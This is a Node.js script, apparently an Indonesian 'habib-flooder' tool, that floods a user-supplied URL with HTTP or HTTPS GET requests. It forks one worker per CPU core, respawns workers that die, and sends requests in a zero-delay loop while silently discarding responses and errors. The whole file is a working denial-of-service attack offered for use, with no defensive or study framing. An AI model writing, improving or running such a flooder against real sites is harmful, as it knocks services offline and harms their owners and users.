const http = require('http');
const https = require('https');
const cluster = require('cluster');
const numCPUs = require('os').cpus().length;

const target = process.argv[2];
const threads = 500; // Jumlah request per batch

if (!target) {
    console.log("\x1b[31m[ERROR]\x1b[0m Masukkan URL target!");
    console.log("Contoh: node habib-flooder.js https://target-anda.com");
    process.exit(1);
}

if (cluster.isMaster) {
    const randomIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    console.log("------------------------------------------");
    console.log("\x1b[36m[SYSTEM]\x1b[0m VPS NODE ACTIVE");
    console.log(`\x1b[32m[INFO]\x1b[0m IP ADDRESS : ${randomIp}`);
    console.log(`\x1b[32m[INFO]\x1b[0m USERNAME   : habib`);
    console.log(`\x1b[32m[INFO]\x1b[0m PASSWORD   : habib`);
    console.log(`\x1b[32m[INFO]\x1b[0m CORES USED: ${numCPUs}`);
    console.log("------------------------------------------");
    console.log(`\x1b[33m[STORM]\x1b[0m Menyerang: ${target}`);

    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker) => {
        cluster.fork();
    });
} else {
    function sendRequest() {
        const agent = target.startsWith('https') ? https : http;
        const options = {
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 14) habib-flooder/2.0',
                'Accept': '*/*',
                'Connection': 'keep-alive'
            },
            timeout: 1000
        };

        const req = agent.get(target, options, (res) => {
            // Berjalan tanpa output agar ringan
        });

        req.on('error', () => {});
    }

    setInterval(sendRequest, 0); // Kecepatan maksimal
}

